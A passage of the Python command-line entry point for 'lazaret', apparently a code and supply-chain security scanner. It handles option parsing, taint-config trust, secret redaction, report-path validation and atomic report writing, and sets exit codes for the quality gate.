                         "loaded (missing, unreadable, invalid JSON, too deep) or "
                         "has rules rejected by validation exits 4.")
    ap.add_argument("--trust-repo-config", action="store_true",
                    help="Load the scanned repository's own .lazaret-taint.json "
                         "(sources and sinks only — its sanitizers are ignored). "
                         "Without this flag the file is noted and not loaded.")
    ap.add_argument("--strict-taint-config", action="store_true",
                    help="Treat taint-config rules rejected by validation (unknown "
                         "category, empty pattern), and a config that can't be "
                         "loaded, as fatal — exit 4 even for the repository's "
                         ".lazaret-taint.json. Always on for an explicit "
                         "--taint-config.")
    ap.add_argument("--ci", action="store_true", help="Exit 1 if the quality gate fails")
    ap.add_argument("--no-redact-secrets", action="store_true",
                    help="Opt OUT of secret redaction in reports: keep the matched line "
                         "for credential findings (S-SECRET/S-TOKEN/SQL-CRED/S-ENTROPY). "
                         "By default the flagged line is replaced with a placeholder in "
                         "every artifact — terminal, JSON/HTML/SARIF reports — so scans of "
                         "your own code do not persist credentials into CI artifacts.")
    ap.add_argument("--excerpt-width", type=int, default=EXCERPT_WIDTH, metavar="N",
                    help=f"Chars of the matched line to show under each finding (default {EXCERPT_WIDTH})")
    ap.add_argument("--max-source-bytes", type=_positive_int, metavar="BYTES",
                    help=f"Largest source file or manifest read (default {SOURCE_SIZE_CAP:,}, env "
                         f"LAZARET_MAX_SOURCE_BYTES); a larger one is not scanned and gets "
                         f"SC-TRUNCATED, which fails the gate")
    ap.add_argument("--engine", choices=engine.ENGINES, default=None,
                    help="The engine that runs the supply-chain tests: rust (the native engine, the default "
                         "where it is installed) or python (the reference engine; env LAZARET_ENGINE). Both "
                         "give the same findings.")
    ap.add_argument("-q", "--quiet", action="store_true")
    args = ap.parse_args(argv)
    try:
        engine.choose(args.engine)
    except engine.EngineError as exc:
        print(f"error: {exc}", file=sys.stderr)
        sys.exit(EXIT_USAGE)
    REDACT_SECRETS = not args.no_redact_secrets
    EXCERPT_WIDTH = args.excerpt_width
    if args.max_source_bytes:
        SOURCE_SIZE_CAP = args.max_source_bytes

    # Usage errors (exit 2) before anything else: a missing target, a file
    # instead of a directory. (An unreadable or empty directory is reported
    # by scan_project, also exit 2.)
    target_disp = sanitize_term_line(_fs_display(args.directory))
    if not os.path.exists(args.directory):
        print(f"error: {target_disp} does not exist (expected a directory to scan)",
              file=sys.stderr)
        sys.exit(EXIT_USAGE)
    if not os.path.isdir(args.directory):
        print(f"error: {target_disp} is not a directory (lazaret scans a project "
              f"directory; for single files use the MCP scan_files tool)", file=sys.stderr)
        sys.exit(EXIT_USAGE)

    # Report destinations (JSON/HTML/SARIF): resolve under the scan root (or
    # --out-dir) — never bare CWD-relative names — and validate BEFORE
    # scanning, so an unwritable/read-only output location fails fast with a
    # clear message instead of a post-scan PermissionError that throws away a
    # completed scan, and a pre-existing file is never silently clobbered.
    try:
        if args.out_dir:
            lazaret_report.validate_out_dir(args.out_dir)
        paths = lazaret_report.report_paths(args, args.directory)
        if args.no_json:
            paths.pop("json")
        if args.no_html:
            paths.pop("html")
        if not args.sarif:
            paths.pop("sarif")
        if paths:
            lazaret_report.validate_report_paths(
                paths, strict=args.force_overwrite)
    except lazaret_report.ReportPathError as exc:
        # audit H1: {exc} echoes the operator-supplied path, which may sit
        # under the scanned repo (--out-dir / report names); sanitize it.
        print(f"error: {sanitize_term_line(exc)}", file=sys.stderr)
        sys.exit(lazaret_report.EXIT_OUTPUT)

    # taint config: --taint-config (trusted), else the repo's own
    # .lazaret-taint.json only with --trust-repo-config (sources/sinks only).
    # Fail-loud validation; exit 4 on rejected rules when strict. Returns
    # the report notes (Q-TAINT-CONFIG) for a used repository config.
    taint_notes = load_taint_config_for_scan(
        args.taint_config, args.directory, trust_repo=args.trust_repo_config,
        strict=args.strict_taint_config)

    # ---- the project scan: one pipeline shared with the MCP server --------
    # (collect -> scan -> manifests -> collection findings -> flow ->
    # skipped-tree notes -> gate -> redaction; see scan_project). The taint
    # config above is already applied, so none is passed here.
    try:
        res = scan_project(args.directory, args.exclude, include_deps=args.deps,
                           redact_secrets=REDACT_SECRETS, extra_issues=taint_notes)
    except ScanTargetError as exc:
        print(f"error: {sanitize_term_line(exc)}", file=sys.stderr)
        sys.exit(EXIT_USAGE)
    for warning in res.get("warnings", ()):
        # audit H1: a warning can carry content parsed out of scanned files
        # (the flow engine raises on hostile input); sanitize it.
        print(f"warning: {sanitize_term_line(warning)}", file=sys.stderr)

    # ---- SEAM (flow-sca): baseline block ---------------------------------
    if args.baseline:
        apply_baseline(res, args.baseline, scan_root=args.directory)
    print_report(res, args.quiet)

    # Writes are validated (writability + no-clobber) before the scan; each
    # write re-checks and is atomic (temp file + rename), so a mid-write
    # crash never leaves a half-written report behind.
    try:
        if args.sarif:
            sarif_path = lazaret_report.write_report(
                paths["sarif"],
                lambda: lazaret_report.sarif_renderer(sarif_report(res, root=args.directory)),
                kind="sarif", strict=args.force_overwrite)
            print(f"  SARIF report: {sanitize_term_line(sarif_path)}")
        if not args.no_json:
            json_path = lazaret_report.write_report(
                paths["json"],
                lambda: lazaret_report.json_renderer(res),
                kind="json", strict=args.force_overwrite)
            print(f"  JSON report: {sanitize_term_line(json_path)}")
        if not args.no_html:
            html_path = lazaret_report.write_report(
                paths["html"],
                lambda: _html_report_marked(res),
                kind="html", strict=args.force_overwrite)
            print(f"  HTML report: {sanitize_term_line(html_path)}")
    except lazaret_report.ReportPathError as exc:
        # Only reachable if the pre-scan checks raced with an external
        # change (TOCTOU); the scan itself already ran and printed above.
        # audit H1: sanitize the echoed path before it reaches the terminal.
        print(f"error: {sanitize_term_line(exc)}", file=sys.stderr)
        sys.exit(lazaret_report.EXIT_OUTPUT)
    except OSError as exc:
        # disk full, quota, a directory removed mid-run: an output error (3),
        # not an internal one.
        print(f"error: could not write a report: {sanitize_term_line(_safe_text(exc))}",
              file=sys.stderr)
        sys.exit(lazaret_report.EXIT_OUTPUT)
    print()
    if args.ci and not res["pass"]:
        sys.exit(EXIT_GATE)
    # 48033f94: a hostile-depth manifest (SC-MANIFEST-DEPTH) exists only to
    # crash or blind scanners, so it forces exit 1 even without --ci (scan
    # completes, reports are written — then signal). It is the ONLY such
    # finding: every other one, CRITICAL SC-* included, leaves the exit code
    # to --ci (review item 6: any CRITICAL SC-* used to exit 1 without --ci,
    # contradicting the documented "0 without --ci").
    if any(i.get("rule") == "SC-MANIFEST-DEPTH" for i in res["issues"]):
        sys.exit(EXIT_GATE)
    return EXIT_OK

if __name__ == "__main__":
    main()
